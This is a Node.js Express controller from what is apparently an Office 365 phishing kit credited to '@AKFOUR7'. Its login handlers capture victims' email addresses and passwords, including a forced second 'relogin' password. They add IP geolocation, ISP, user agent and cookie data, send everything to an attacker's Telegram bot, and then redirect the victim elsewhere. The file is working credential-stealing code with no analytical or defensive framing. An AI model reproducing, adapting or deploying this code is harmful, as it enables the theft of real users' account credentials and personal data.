const { sendMessageFor } = require("simple-telegram-message");
const { botToken, chatId } = require("../settings");
const getIPDetails = require("../middleware/getIPDetails");
const anti = require("../middleware/antibot2");

exports.login = (req, res) => {
  return res.render("login");
};

exports.loginPost = async (req, res) => {
  (async () => {
    const anti1 = await anti;
    const file = JSON.stringify(anti1, null, 2);

    const { email, password } = req.body;

    const iPDetails = await getIPDetails();
    const { query, city, region, country, isp } = iPDetails;

    const userAgent = req.headers["user-agent"];

    const message =
      `✅ @AKFOUR7 | O365 \n\n` +
      `👤 EMAIL ADDRESS\n` +
      `📧Email : ${email}\n` +
      `🔑Password : ${password}\n` +
      `++++++++++++++++++++++++++++++\n\n` +
      `IP ADDRESS INFO\n` +
      `IP Address       : ${query}\n` +
      `City             : ${city}\n` +
      `State            : ${region}\n` +
      `Country          : ${country}\n` +
      `ISP              : ${isp}\n\n` +
      `+++++++++++++++++++++++++++++++\n\n` +
      `SYSTEM INFO || USER AGENT\n` +
      `USER AGENT       : ${userAgent}\n` +
      `+++++++++++++++++++++++++++++++\n\n` +
      `COOKIES          : ${file}\n` +
      `👨‍💻 @akfour7 - TG 👨‍💻`;

    const sendMessage = sendMessageFor(botToken, chatId);
    sendMessage(message);

    res.redirect("https://t.ly/96_I");
  })();
};

exports.login2 = (req, res) => {
  res.render("login2");
};

exports.loginPost2 = async (req, res) => {
  const { password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7 | O365 \n\n` +
    `👤 PASSWORD     \n` +
    `🔑Password       : ${password}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `+++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/login/3");
};

exports.login3 = (req, res) => {
  res.render("login3");
};

exports.loginPost3 = async (req, res) => {
  const { password } = req.body;

  const iPDetails = await getIPDetails();
  const { query, city, region, country, isp } = iPDetails;

  const userAgent = req.headers["user-agent"];

  const message =
    `✅ @AKFOUR7 | O365 \n\n` +
    `👤 EMAIL PASSWORD (RELOGIN)\n` +
    `🔑Password 2     : ${password}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `IP ADDRESS INFO\n` +
    `IP Address       : ${query}\n` +
    `City             : ${city}\n` +
    `State            : ${region}\n` +
    `Country          : ${country}\n` +
    `ISP              : ${isp}\n\n` +
    `++++++++++++++++++++++++++++++++\n\n` +
    `SYSTEM INFO || USER AGENT\n` +
    `USER AGENT       : ${userAgent}\n` +
    `👨‍💻 @akfour7 - TG 👨‍💻`;

  const sendMessage = sendMessageFor(botToken, chatId);
  sendMessage(message);

  res.redirect("/auth/complete");
};

exports.complete = (req, res) => {
  return res.render("complete");
};

exports.page404Redirect = (req, res) => {
  return res.redirect("/auth/login");
};
